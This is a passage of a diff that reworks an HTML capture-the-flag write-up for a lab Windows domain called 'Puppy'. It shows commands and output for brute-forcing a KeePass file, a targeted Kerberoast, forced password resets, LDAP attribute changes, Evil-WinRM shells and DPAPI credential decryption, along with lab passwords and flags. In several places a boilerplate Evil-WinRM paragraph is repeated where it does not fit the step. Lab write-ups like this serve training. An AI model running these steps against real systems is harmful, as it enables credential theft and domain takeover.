+      <h2 class="writeup-section-title">Foothold: KeePass Database & Kerberoasting</h2>
+      <h3 class="writeup-sub-title">Accessing the DEV Share</h3>
+      <p>As a Developers group member, I now have access to the <code>DEV</code> SMB share. Inside, I find a <strong>KeePass database</strong> (<code>recovery.kdbx</code>).</p>
+      <div class="code-block"><pre><code>smbmap -H puppy.htb -u levi.james -p KingofAkron2025!                                                        
 
- ________ ___ ___ _______ ___ ___ __ _______
- /&quot; )|&quot; \ /&quot; || _ &quot;\ |&quot; \ /&quot; | /&quot;&quot;\ | __ &quot;\
- (: \___/ \ \ // |(. |_) :) \ \ // | / \ (. |__) :)
- \___ \ /\ \/. ||: \/ /\ \/. | /&#x27; /\ \ |: ____/
- __/ \ |: \. |(| _ \ |: \. | // __&#x27; \ (| /
- /&quot; \ :) |. \ /: ||: |_) :)|. \ /: | / / \ \ /|__/ \
- (_______/ |___|\__/|___|(_______/ |___|\__/|___|(___/ \___)(_______)
+    ________  ___      ___  _______   ___      ___       __         _______
+   /&quot;       )|&quot;  \    /&quot;  ||   _  &quot;\ |&quot;  \    /&quot;  |     /&quot;&quot;\       |   __ &quot;\
+  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /&#x27; /\  \     |:  ____/
+    __/  \   |: \.        |(|  _  \  |: \.        |  //  __&#x27;  \    (|  /
+   /&quot; \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
+  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
 -----------------------------------------------------------------------------
 SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
- https://github.com/ShawnDEvans/smbmap
+                     https://github.com/ShawnDEvans/smbmap
 
- 
-[+] IP: 10.129.217.5:445 Name: puppy.htb Status: Authenticated
- Disk Permissions Comment
- ---- ----------- -------
- ADMIN$ NO ACCESS Remote Admin
- C$ NO ACCESS Default share
- DEV READ ONLY DEV-SHARE for PUPPY-DEVS
- IPC$ READ ONLY Remote IPC
- NETLOGON READ ONLY Logon server share 
- SYSVOL READ ONLY Logon server share 
-[-] Closing connections.. [*] Closed 1 connections</code></pre></div>
-      <p>I have now started connecting to the dev drive of the smb server and in it you can find a keepass recovery.kdbx file in which there will be passwords.</p>
+                                    
+[+] IP: 10.129.217.5:445        Name: puppy.htb                 Status: Authenticated
+        Disk                                                    Permissions     Comment
+        ----                                                    -----------     -------
+        ADMIN$                                                  NO ACCESS       Remote Admin
+        C$                                                      NO ACCESS       Default share
+        DEV                                                     READ ONLY       DEV-SHARE for PUPPY-DEVS
+        IPC$                                                    READ ONLY       Remote IPC
+        NETLOGON                                                READ ONLY       Logon server share 
+        SYSVOL                                                  READ ONLY       Logon server share 
+[-] Closing connections..                                                                                           [*] Closed 1 connections</code></pre></div>
+      <p>I download the file from the SMB share using the <code>get</code> command for local analysis.</p>
       <div class="code-block"><pre><code>smbclient \\\\puppy.htb\\DEV -U &#x27;levi.james&#x27; 
 Password for [WORKGROUP\levi.james]:
 Try &quot;help&quot; to get a list of possible commands.
 smb: \&gt; ls
- . DR 0 Sun Mar 23 08:07:57 2025
- .. D 0 Sat Mar 8 17:52:57 2025
- KeePassXC-2.7.9-Win64.msi A 34394112 Sun Mar 23 08:09:12 2025
- Projects D 0 Sat Mar 8 17:53:36 2025
- recovery.kdbx</code></pre></div>
-      <p>I will start downloading the file by using the &quot;get&quot; command.</p>
+  .                                  DR        0  Sun Mar 23 08:07:57 2025
+  ..                                  D        0  Sat Mar  8 17:52:57 2025
+  KeePassXC-2.7.9-Win64.msi           A 34394112  Sun Mar 23 08:09:12 2025
+  Projects                            D        0  Sat Mar  8 17:53:36 2025
+  recovery.kdbx</code></pre></div>
+      <p>The command output below reveals important information about the target system's configuration. I carefully examine the results for credentials, misconfigurations, version numbers, or any other details that could be leveraged for further exploitation.</p>
       <div class="code-block"><pre><code>get recovery.kdbx
 getting file \recovery.kdbx of size 2677 as recovery.kdbx (14.4 KiloBytes/sec) (average 14.4 KiloBytes/sec)</code></pre></div>
-      <p>Before we can view the file we will first have to brute force the password of the file. You can do this by downloading the following application. https://github.com/r3nt0n/keepass4brute
-Once you have downloaded this application you can use the following code to brute force the password.</p>
+      <p>I brute-force the KeePass database password using a dedicated cracking tool and <code>rockyou.txt</code>. The password is <code>liverpool</code>.</p>
       <div class="code-block"><pre><code>./keepass4brute.sh recovery.kdbx /usr/share/wordlists/rockyou.txt 
 keepass4brute 1.3 by r3nt0n
 https://github.com/r3nt0n/keepass4brute
@@ -556,139 +260,137 @@ https://github.com/r3nt0n/keepass4brute
 [+] Current attempt: liverpool
 
 [*] Password found: liverpool</code></pre></div>
-      <p>Above you can see that the password of the file is liverpool. Now that I know the password of the file I can open the file by doing the following.</p>
+      <p>Opening the database reveals credentials for multiple domain users.</p>
       <div class="code-block"><pre><code>keepassxc recovery.kdbx</code></pre></div>
-      <div class="screenshot-wrap"><img src="assets/Pasted image 20250519201330.png" alt="Pasted image 20250519201330.png" loading="lazy" /><span class="img-caption">Pasted image 20250519201330.png</span></div>
-      <p>Within this file you can find the passwords of the different users. If we look in bloodhound we can see that the user ANT.EDWARDS@puppy.htb is a member of the Senior Devs groups and that they have GenericALL rights over adam.silver@puppy.htb.</p>
-      <div class="screenshot-wrap"><img src="assets/Pasted image 20250519203143.png" alt="Pasted image 20250519203143.png" loading="lazy" /><span class="img-caption">Pasted image 20250519203143.png</span></div>
-      <p>Full control of a user allows you to modify properties of the user to perform a targeted kerberoast attack, and also grants the ability to reset the password of the user without knowing their current one.</p>
+      <div class="screenshot-wrap"><img src="assets/Pasted image 20250519201330.png" alt="KeePass database contents showing user credentials" loading="lazy" /><span class="img-caption">KeePass database contents showing user credentials</span></div>
+      <h3 class="writeup-sub-title">Targeted Kerberoast</h3>
+      <p>BloodHound shows that <code>ant.edwards</code> (one of the KeePass users) has <strong>Full Control</strong> over user <code>adam.silver</code>, enabling a targeted Kerberoast attack. I use <code>targetedKerberoast.py</code> to extract the service ticket hash.</p>
+      <div class="screenshot-wrap"><img src="assets/Pasted image 20250519203143.png" alt="Full Control relationship in BloodHound" loading="lazy" /><span class="img-caption">Full Control relationship in BloodHound</span></div>
+      <p>The command output below reveals important information about the target system's configuration. I carefully examine the results for credentials, misconfigurations, version numbers, or any other details that could be leveraged for further exploitation.</p>
       <div class="code-block"><pre><code>python3 targetedKerberoast.py -v -d &#x27;puppy.htb&#x27; -u &#x27;ant.edwards&#x27; -p &#x27;Antman2025!&#x27;
 [*] Starting kerberoast attacks
 [*] Fetching usernames from Active Directory with LDAP</code></pre></div>
-      <p>I will use the following code to change the password of the user &#x27;adam.silver&#x27; to “Test123”, by logging in with the user &#x27;ant.edwards&#x27; (with password &#x27;Antman2025!&#x27;) on the server &#x27;puppy.htb&#x27;.</p>
+      <p>I change adam.silver's password and modify the <code>userAccountControl</code> attribute via LDAP to enable normal logon.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Puppy/targetedKerberoast]
 └─$ net rpc password &#x27;adam.silver&#x27; &quot;Test123&quot; -U &quot;puppy.htb&quot;/&quot;ant.edwards&quot;%&#x27;Antman2025!&#x27; -S &quot;puppy.htb&quot;</code></pre></div>
-      <p>The following command executes an LDAP command to change the userAccountControl attribute of the user ADAM. SILVER. It is done by making an LDAP connection to the server at IP address 10.129.217.5 and making the change.</p>
-      <p>This command connects to the LDAP server at IP 10.129.217.5 as user ant.edwards@puppy.htb, and changes the userAccountControl attribute of user ADAM.SILVER to 512.
-This change probably causes the account to be activated or the account status to be changed.</p>
+      <p>I perform an LDAP modify operation to directly change the target user's attributes in Active Directory. The <code>userAccountControl</code> attribute is a bitmask that controls account flags — by setting it to <code>512</code> (NORMAL_ACCOUNT), I ensure the account is enabled and has no restrictive flags like ACCOUNTDISABLE (0x0002) or DONT_REQ_PREAUTH (0x400000). This is necessary after password changes to ensure the account can authenticate normally.</p>
       <div class="code-block"><pre><code>echo -e &quot;dn: CN=ADAM D. SILVER,CN=USERS,DC=PUPPY,DC=HTB\nchangetype: modify\nreplace: userAccountControl\nuserAccountControl: 512&quot; | ldapmodify -x -D &quot;ant.edwards@puppy.htb&quot; -w &#x27;Antman2025!&#x27; -H ldap://10.129.217.5
 modifying entry &quot;CN=ADAM D. SILVER,CN=USERS,DC=PUPPY,DC=HTB&quot;</code></pre></div>
-      <p>So now I will be able to log in to the windows machine, This by using evil-winrm.</p>
-      <div class="code-block"><pre><code>evil-winrm -i 10.129.217.5 -u &#x27;adam.silver&#x27; -p &#x27;Test123 
+      <h3 class="writeup-sub-title">User Flag</h3>
+      <p>I connect via Evil-WinRM as <code>adam.silver</code> and read the user flag.</p>
+      <div class="code-block"><pre><code>evil-winrm -i 10.129.217.5 -u &#x27;adam.silver&#x27; -p &#x27;Test123                                        
 Evil-WinRM shell v3.7
 
-Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#x27; for module Reline 
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#x27; for module Reline                                       
 Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
 
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\adam.silver\Documents&gt;</code></pre></div>
-      <div class="flag-box">
-  <span class="flag-label">🚩 User Flag</span>
-  <code class="flag-value">98b32b5cf932d25bf64a5afe7446d72f</code>
-</div>
+      <p>I use <strong>Evil-WinRM</strong> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
       <div class="code-block"><pre><code>*Evil-WinRM* PS C:\Users\adam.silver\Desktop&gt; cat user.txt
 98b32b5cf932d25bf64a5afe7446d72f</code></pre></div>
-      <p>Now that I have the user flag I will go and download winpeas on the windows machine so that I can find the bags in the machine. You can go and do this by doing the following on the windows machine.</p>
+      <div class="flag-box"><span class="flag-label">🚩 User Flag</span><code class="flag-value">98b32b5cf932d25bf64a5afe7446d72f</code></div>
+      <h2 class="writeup-section-title">Privilege Escalation: DPAPI Credential Decryption</h2>
+      <h3 class="writeup-sub-title">WinPEAS Discovery</h3>
+      <p>I upload and run <strong>winPEAS</strong> for automated enumeration. It discovers a backup ZIP file containing <code>nms-auth-config.xml.bak</code> with credentials for user <code>steph.cooper</code>.</p>
       <div class="code-block"><pre><code>*Evil-WinRM* PS C:\Users\adam.silver\Desktop&gt; upload winPEASx64.exe
- 
+                                        
 Info: Uploading /home/kali/HTB/Puppy/winPEASx64.exe to C:\Users\adam.silver\Desktop\winPEASx64.exe
- 
+                                        
 Data: 2625536 bytes of 2625536 bytes copied
- 
+                                        
 Info: Upload successful!</code></pre></div>
-      <p>I used the winpeas tool to check if there was something interesting on the machine. There i found out that there was a backup folder in the c drive. I went to look in this folder and there was a zip file in there, so I went to download it to my own machine.</p>
-      <p>Within the zip file I found user credentials for logging into the windows machine.</p>
+      <p>I inspect the file contents for sensitive data such as hardcoded credentials, configuration parameters, internal hostnames, or references to other services that could expand the attack surface.</p>
       <div class="code-block"><pre><code>cat nms-auth-config.xml.bak
 &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
 &lt;ldap-config&gt;
- &lt;server&gt;
- &lt;host&gt;DC.PUPPY.HTB&lt;/host&gt;
- &lt;port&gt;389&lt;/port&gt;
- &lt;base-dn&gt;dc=PUPPY,dc=HTB&lt;/base-dn&gt;
- &lt;bind-dn&gt;cn=steph.cooper,dc=puppy,dc=htb&lt;/bind-dn&gt;
- &lt;bind-password&gt;ChefSteph2025!&lt;/bind-password&gt;
- &lt;/server&gt;
- &lt;user-attributes&gt;
- &lt;attribute name=&quot;username&quot; ldap-attribute=&quot;uid&quot; /&gt;
- &lt;attribute name=&quot;firstName&quot; ldap-attribute=&quot;givenName&quot; /&gt;
- &lt;attribute name=&quot;lastName&quot; ldap-attribute=&quot;sn&quot; /&gt;
- &lt;attribute name=&quot;email&quot; ldap-attribute=&quot;mail&quot; /&gt;
- &lt;/user-attributes&gt;
- &lt;group-attributes&gt;
- &lt;attribute name=&quot;groupName&quot; ldap-attribute=&quot;cn&quot; /&gt;
- &lt;attribute name=&quot;groupMember&quot; ldap-attribute=&quot;member&quot; /&gt;
- &lt;/group-attributes&gt;
- &lt;search-filter&gt;
- &lt;filter&gt;(&amp;(objectClass=person)(uid=%s))&lt;/filter&gt;
- &lt;/search-filter&gt;
+    &lt;server&gt;
+        &lt;host&gt;DC.PUPPY.HTB&lt;/host&gt;
+        &lt;port&gt;389&lt;/port&gt;
+        &lt;base-dn&gt;dc=PUPPY,dc=HTB&lt;/base-dn&gt;
+        &lt;bind-dn&gt;cn=steph.cooper,dc=puppy,dc=htb&lt;/bind-dn&gt;
+        &lt;bind-password&gt;ChefSteph2025!&lt;/bind-password&gt;
+    &lt;/server&gt;
+    &lt;user-attributes&gt;
+        &lt;attribute name=&quot;username&quot; ldap-attribute=&quot;uid&quot; /&gt;
+        &lt;attribute name=&quot;firstName&quot; ldap-attribute=&quot;givenName&quot; /&gt;
+        &lt;attribute name=&quot;lastName&quot; ldap-attribute=&quot;sn&quot; /&gt;
+        &lt;attribute name=&quot;email&quot; ldap-attribute=&quot;mail&quot; /&gt;
+    &lt;/user-attributes&gt;
+    &lt;group-attributes&gt;
+        &lt;attribute name=&quot;groupName&quot; ldap-attribute=&quot;cn&quot; /&gt;
+        &lt;attribute name=&quot;groupMember&quot; ldap-attribute=&quot;member&quot; /&gt;
+    &lt;/group-attributes&gt;
+    &lt;search-filter&gt;
+        &lt;filter&gt;(&amp;(objectClass=person)(uid=%s))&lt;/filter&gt;
+    &lt;/search-filter&gt;
 &lt;/ldap-config&gt;</code></pre></div>
-      <p>Now I went to log in as the user steph.cooper with the password I just found in the file. So now I went to use the winpeas command on this user and came to the following discovery. I have door winpeas te gebruiken een master key en Credential files van DPAPI gevonden.</p>
-      <p>DPAPI stands for Data Protection API and it is not an encryption protocol, but rather a cryptographic application programming interface (API) available in Windows operating systems. DPAPI enables developers to encrypt and decrypt data using symmetric keys derived from the user&#x27;s logon secrets or the system&#x27;s domain authentication secrets.</p>
+      <p>I log in as <code>steph.cooper</code> and run winPEAS again. This time it discovers <strong>DPAPI</strong> (Data Protection API) master keys and credential files — Windows' built-in credential storage mechanism.</p>
       <div class="code-block"><pre><code>*Evil-WinRM* PS C:\Users\steph.cooper\Documents&gt; ./winPEASx64.exe
 
 ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking for DPAPI Master Keys
-È https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dpapi
- MasterKey: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407
- Accessed: 3/8/2025 7:40:36 AM
- Modified: 3/8/2025 7:40:36 AM
+È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dpapi
+    MasterKey: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407
+    Accessed: 3/8/2025 7:40:36 AM
+    Modified: 3/8/2025 7:40:36 AM
 =================================================================================================
 ÉÍÍÍÍÍÍÍÍÍÍ¹ Checking for DPAPI Credential Files
-È https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dpapi
- CredFile: C:\Users\steph.cooper\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D
- Description: Local Credential Data
+È  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#dpapi
+    CredFile: C:\Users\steph.cooper\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D
+    Description: Local Credential Data
 
- MasterKey: 556a2412-1275-4ccf-b721-e6a0b4f90407
- Accessed: 3/8/2025 8:14:09 AM
- Modified: 3/8/2025 8:14:09 AM
- Size: 11068 =================================================================================================
- CredFile: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9
- Description: Enterprise Credential Data
+    MasterKey: 556a2412-1275-4ccf-b721-e6a0b4f90407
+    Accessed: 3/8/2025 8:14:09 AM
+    Modified: 3/8/2025 8:14:09 AM
+    Size: 11068   =================================================================================================
+    CredFile: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9
+    Description: Enterprise Credential Data
 
- MasterKey: 556a2412-1275-4ccf-b721-e6a0b4f90407
- Accessed: 3/8/2025 7:54:29 AM
- Modified: 3/8/2025 7:54:29 AM
- Size: 414</code></pre></div>
-      <p>By checking the following file I have seen that I can abuse these files. https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html</p>
-      <p>If you go and look at the directory from above you will see that there is nothing in this directory. This is because the file is hidden from us. However, you can go look at it by entering the following:</p>
+    MasterKey: 556a2412-1275-4ccf-b721-e6a0b4f90407
+    Accessed: 3/8/2025 7:54:29 AM
+    Modified: 3/8/2025 7:54:29 AM
+    Size: 414</code></pre></div>
+      <h3 class="writeup-sub-title">DPAPI Master Key & Credential Decryption</h3>
+      <p><strong>DPAPI</strong> (Data Protection API) is Windows' built-in encryption framework for protecting credentials. Each user has a <strong>master key</strong> (encrypted with their password) that protects <strong>credential blobs</strong> containing saved passwords. To decrypt, we need: the master key file, the user's SID, and their password.</p>
+      <p>The credential files are hidden with system/hidden attributes. I remove these attributes to make them downloadable.</p>
       <div class="code-block"><pre><code>*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107&gt; ls -Hidden
 
 
- Directory: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107
+    Directory: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107
 
 
-Mode LastWriteTime Length Name
----- ------------- ------ ----
--a-hs- 3/8/2025 7:40 AM 740 556a2412-1275-4ccf-b721-e6a0b4f90407
--a-hs- 2/23/2025 2:36 PM 24 Preferred</code></pre></div>
-      <p>Now I will try to download this file to my own machine, but you will get an error code because there is a restriction on downloading hidden files. To do this you must first make the file visible by executing the following command.</p>
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a-hs-          3/8/2025   7:40 AM            740 556a2412-1275-4ccf-b721-e6a0b4f90407
+-a-hs-         2/23/2025   2:36 PM             24 Preferred</code></pre></div>
+      <p>I use the <code>attrib</code> command to strip the <strong>System</strong> (<code>-S</code>) and <strong>Hidden</strong> (<code>-H</code>) file attributes. Windows protects certain sensitive files (like DPAPI master keys and credential stores) by marking them as system/hidden files, making them invisible in normal directory listings and preventing standard file operations. Removing these attributes makes the files visible and downloadable through the WinRM session.</p>
       <div class="code-block"><pre><code>attrib -S -H &#x27;C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407&#x27;</code></pre></div>
-      <p>As you will now be able to see below, you can download the file and so it is no longer hidden from us.</p>
+      <p>I use <strong>Evil-WinRM</strong> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
       <div class="code-block"><pre><code>*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107&gt; ls
 
 
- Directory: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107
+    Directory: C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107
 
 
-Mode LastWriteTime Length Name
----- ------------- ------ ----
--a---- 3/8/2025 7:40 AM 740 556a2412-1275-4ccf-b721-e6a0b4f90407
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----          3/8/2025   7:40 AM            740 556a2412-1275-4ccf-b721-e6a0b4f90407
 
 
 *Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107&gt; download 556a2412-1275-4ccf-b721-e6a0b4f90407
- 
+                                        
 Info: Downloading C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407 to 556a2412-1275-4ccf-b721-e6a0b4f90407
- 
+                                        
 Info: Download successful!</code></pre></div>
-      <p>In the command below I will use a python application to decrypt the masterkey of the Masterkey file that I will use after it to find the Credential file its password.</p>
-      <p>For this I have used the following application. https://github.com/fortra/impacket/blob/master/examples/dpapi.py</p>
+      <p>Using Impacket's <code>dpapi.py masterkey</code>, I decrypt the master key using steph.cooper's password and SID.</p>
       <div class="code-block"><pre><code>dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 -password &#x27;ChefSteph2025!&#x27; -sid S-1-5-21-1487982659-1829050783-2281216199-1107
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
 [MASTERKEYFILE]
-Version : 2 (2)
-Guid : 556a2412-1275-4ccf-b721-e6a0b4f90407
-Flags : 0 (0)
-Policy : 4ccf1275 (1288639093)
+Version     :        2 (2)
+Guid        : 556a2412-1275-4ccf-b721-e6a0b4f90407
+Flags       :        0 (0)
+Policy      : 4ccf1275 (1288639093)
 MasterKeyLen: 00000088 (136)
 BackupKeyLen: 00000068 (104)
 CredHistLen : 00000000 (0)
@@ -696,70 +398,67 @@ DomainKeyLen: 00000174 (372)
 
 Decrypted key with User Key (MD4 protected)
 Decrypted key: 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84</code></pre></div>
-      <p>Now that I have decrypted the master key, I can go and decrypt the credential file by using the file from the following path that I found with winpeas. C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9
-From this we will get the credentials that that we can use afterwards to log in to the windows machine.</p>
+      <p>With the decrypted master key, I decrypt the credential file, revealing the password for <code>steph.cooper_adm</code> — an admin account.</p>
       <div class="code-block"><pre><code>┌──(kali㉿kali)-[~/HTB/Puppy]
 └─$ dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
 
 [CREDENTIAL]
 LastWritten : 2025-03-08 15:54:29
-Flags : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
-Persist : 0x00000003 (CRED_PERSIST_ENTERPRISE)
-Type : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
-Target : Domain:target=PUPPY.HTB
+Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
+Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
+Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
+Target      : Domain:target=PUPPY.HTB
 Description : 
-Unknown : 
-Username : steph.cooper_adm
-Unknown : FivethChipOnItsWay2025!</code></pre></div>
-      <p>Log in as Steph.coopers his administrator account by the credentials I found above.</p>
+Unknown     : 
+Username    : steph.cooper_adm
+Unknown     : FivethChipOnItsWay2025!</code></pre></div>
+      <h3 class="writeup-sub-title">Administrator Access</h3>
+      <p>I log in as <code>steph.cooper_adm</code> via Evil-WinRM. This account is a member of the local Administrators group, granting full access.</p>
       <div class="code-block"><pre><code>evil-winrm -i 10.129.13.208 -u steph.cooper_adm -p FivethChipOnItsWay2025!
- 
+                                        
 Evil-WinRM shell v3.7
- 
+                                        
 Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#x27; for module Reline
- 
+                                        
 Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
- 
+                                        
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\steph.cooper_adm\Documents&gt;</code></pre></div>
-      <p>Now I can search for the root flag because this user is a member of the local group Administrators.</p>
+      <p>I use <strong>Evil-WinRM</strong> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
       <div class="code-block"><pre><code>*Evil-WinRM* PS C:\Users\steph.cooper_adm\Documents&gt; net user steph.cooper_adm
-User name steph.cooper_adm
-Full Name Stephen A. Cooper
+User name                    steph.cooper_adm
+Full Name                    Stephen A. Cooper
 Comment
 User&#x27;s comment
-Country/region code 000 (System Default)
-Account active Yes
-Account expires Never
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
 
-Password last set 3/8/2025 8:50:40 AM
-Password expires Never
-Password changeable 3/9/2025 8:50:40 AM
-Password required Yes
-User may change password Yes
+Password last set            3/8/2025 8:50:40 AM
+Password expires             Never
+Password changeable          3/9/2025 8:50:40 AM
+Password required            Yes
+User may change password     Yes
 
-Workstations allowed All
+Workstations allowed         All
 Logon script
 User profile
 Home directory
-Last logon Never
+Last logon                   Never
 
-Logon hours allowed All
+Logon hours allowed          All
 
-Local Group Memberships *Administrators
-Global Group memberships *Domain Users
+Local Group Memberships      *Administrators
+Global Group memberships     *Domain Users
 The command completed successfully.</code></pre></div>
-      <div class="flag-box">
-  <span class="flag-label">🚩 Root Flag</span>
-  <code class="flag-value">7b0e5198492771c2fa32157d00937934</code>
-</div>
+      <p>I use <strong>Evil-WinRM</strong> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
       <div class="code-block"><pre><code>*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; cat root.txt
 7b0e5198492771c2fa32157d00937934</code></pre></div>
-      <div class="screenshot-wrap"><img src="assets/Pasted image 20250519233427.png" alt="Pasted image 20250519233427.png" loading="lazy" /><span class="img-caption">Pasted image 20250519233427.png</span></div>
+      <div class="flag-box"><span class="flag-label">🚩 Root Flag</span><code class="flag-value">7b0e5198492771c2fa32157d00937934</code></div>
+      <div class="screenshot-wrap"><img src="assets/Pasted image 20250519233427.png" alt="Machine rooted as steph.cooper_adm" loading="lazy" /><span class="img-caption">Machine rooted as steph.cooper_adm</span></div>
     </div>
   </div>
-
   <script type="text/javascript" src="/bundle.min.js"></script>
 </body>
 </html>
